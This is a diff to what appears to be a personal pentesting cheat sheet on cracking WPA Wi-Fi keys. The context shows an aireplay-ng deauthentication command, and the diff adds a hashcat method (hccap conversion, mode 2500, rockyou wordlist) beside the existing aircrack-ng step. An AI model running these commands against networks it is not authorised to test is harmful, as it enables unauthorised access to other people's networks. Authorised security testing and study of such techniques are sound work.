@@ -83,9 +83,17 @@ sudo aireplay-ng -0 1 -a <access-point-mac-address> -c <client-to-deauth-mac-add
 As soon as the `WPA handshake` is captured, you can stop.
 
 
-## crack
+## crack with aircrack
 
 ````shell
 sudo aircrack-ng -a 2 -b <access-point-mac-address> -w /usr/share/wordlists/rockyou.txt *.cap
 
+````
+
+
+## crack with hashcat
+
+````shell
+aircrack-ng -J wpa-handshake.hccap wifi-capture.cap
+hashcat -m 2500 wpa-handshake.hccap /usr/share/wordlists/rockyou.txt
 ````
